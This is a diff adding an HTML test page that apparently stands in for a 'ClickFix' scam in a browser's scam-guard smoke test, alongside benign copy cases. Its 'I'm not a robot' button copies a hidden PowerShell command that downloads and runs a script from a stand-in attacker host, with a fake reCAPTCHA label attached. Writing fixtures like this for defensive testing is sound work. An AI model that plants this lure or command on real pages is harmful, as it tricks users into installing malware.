@@ -1,0 +1,46 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>Scam guards: clipboard</title>
+<!-- A stand-in for a ClickFix page and for ordinary pages that copy text,
+     for smoke_scam_guards.py. ?mode= picks what the one button copies:
+       command    a PowerShell one-liner, with writeText
+       exec       the same, through execCommand("copy")
+       fullscreen the first click goes fullscreen, the second copies the command
+       ordinary   a plain sentence
+       docs       an npm command, as a developer docs site would offer
+     The title says how it went: wrote, or error:<name>. -->
+<style>
+  body { font: 16px sans-serif; margin: 24px; }
+  button { font-size: 20px; padding: 16px 32px; }
+</style>
+<button id="copy">I'm not a robot</button>
+<textarea id="box" rows="2" cols="40"></textarea>
+<script>
+  var mode = new URLSearchParams(location.search).get('mode') || 'command';
+  var COMMAND = 'cmd /c start /min powershell -w hidden -c "iex (irm https://evil.example/a.ps1)" ' +
+      '# I am not a robot - reCAPTCHA Verification ID: 6283';
+  var texts = {
+    command: COMMAND,
+    exec: COMMAND,
+    fullscreen: COMMAND,
+    ordinary: 'See you at 5pm, bring the report',
+    docs: 'npm install --save-dev typescript'
+  };
+  var text = texts[mode];
+  document.getElementById('copy').addEventListener('click', function() {
+    if (mode === 'fullscreen' && !document.fullscreenElement) {
+      document.documentElement.requestFullscreen();
+      return;
+    }
+    if (mode === 'exec') {
+      var box = document.getElementById('box');
+      box.value = text;
+      box.select();
+      document.title = document.execCommand('copy') ? 'wrote' : 'error:exec';
+      return;
+    }
+    navigator.clipboard.writeText(text).then(
+        function() { document.title = 'wrote'; },
+        function(e) { document.title = 'error:' + e.name; });
+  });
+</script>
